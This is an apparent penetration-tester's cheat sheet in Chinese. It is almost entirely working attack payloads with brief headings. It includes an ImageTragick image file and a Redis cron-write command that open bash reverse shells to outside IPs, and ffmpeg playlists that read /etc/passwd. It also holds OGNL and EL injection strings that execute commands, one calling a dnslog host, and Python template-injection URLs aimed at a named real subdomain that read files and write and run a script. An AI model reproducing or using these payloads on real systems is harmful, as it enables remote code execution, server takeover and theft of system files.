## 本地文件读取
path
filename
src_url


## imagetrick
push graphic-context

viewbox 0 0 640 480

fill 'url(https://"|bash -i >& /dev/tcp/101.200.**.**/8081 0>&1;")'

pop graphic-contextop graphic-context

## ffmpeg
#EXTM3U

#EXT-X-MEDIA-SEQUENCE:0

#EXTINF:10.0,

concat:http://test.com/header.m3u8|file:///etc/passwd

#EXT-X-ENDLIST
## 

#EXTM3U

#EXT-X-MEDIA-SEQUENCE:0

#EXTINF:10.0,

concat:http://test.com/header.m3u8|subfile,,start,30,end,120,,:///etc/passwd

#EXT-X-ENDLIST
沙盒绕过
http://pastebin.com/aE4sKnCg

## redis
echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/114.114.114.114/53 0>&1\n\n"|redis-cli -h 115.182.69.199 -p 3000 -x set 0

config set dir /var/spool/cron/ 

config set dbfilename root

## java远程EL表达式
### 特征是jhtml,还有就是类似service=${1000-900}
companyName=999&groupName=&papersType=${"a9999abbb".toString\u0028\u0029}&papersValue=1&baseacct=1&retMsg=1&retCode=1

groupName=1&papersType=${%23a%3d\u0028new%20java.lang.ProcessBuilder\u0028new%20java.lang.String[]{\u0027/sbin/ifconfig\u0027,\u0027-a\u0027}\u0029\u0029.start\u0028\u0029,%23b%3d%23a.getInputStream\u0028\u0029,%23c%3dnew%**.**.**.**.InputStreamReader\u0028%23b\u0029,%23d%3dnew%**.**.**.**.BufferedReader\u0028%23c\u0029,%23e%3dnew%20char[50000],%23d.read\u0028%23e\u0029,%23ringzero%3d%23context.get\u0028\u0027com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0027\u0029,%23ringzero.getWriter\u0028\u0029.println\u0028%23e\u0029,%23ringzero.getWriter\u0028\u0029.flush\u0028\u0029,%23ringzero.getWriter\u0028\u0029.close\u0028\u0029}&papersValue=1&baseacct=1&retMsg=1&retCode=1

${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'/sbin/ifconfig','-a'})).start(),#b=#a.getInputStream(),#c=new **.**.**.**.InputStreamReader(#b),#d=new **.**.**.**.BufferedReader(#c),#e=new char[50000],#d.read(#e),#ringzero=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#ringzero.getWriter().println(#e),#ringzero.getWriter().flush(),#ringzero.getWriter().close()}

groupName=1&papersType=${new **.**.**.**.File(\u0027/\u0027).listFiles()[1]}&papersValue=1&baseacct=1&retMsg=1&retCode=1

获取web路径

${pageContext.getSession().getServletContext().getClassLoader().getResource("")}

http://www.cnblogs.com/xdp-gacl/p/3938361.html

执行命令
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("dig sougou.99fd5e.dnslog.info",null).getInputStream())}

读取文件位置
${applicationScope}

## 越权
- oauth2未验证access_token

## 修改密码
- 拆分认证，导致可以重置密码，所以要求验证密码的时候，验证码和旧密码和新密码一起验证，避免出现这种情况。

## python模板代码执行
- http://t.youhua.baidu.com/{{open('/etc/passwd').read()}}/about.html
- 写test.py: http://t.youhua.baidu.com/{{open('/tmp/test.py','w').write('import os;os.system("ps aux > /tmp/output")')}}/about.html 

读取test.py核对:http://t.youhua.baidu.com/{{open('/tmp/test.py').read()}}/about.html

执行test.py: http://t.youhua.baidu.com/{{execfile('/tmp/test.py')}}/about.html

读取output: http://t.youhua.baidu.com/{{open('/tmp/output').read()}}/about.html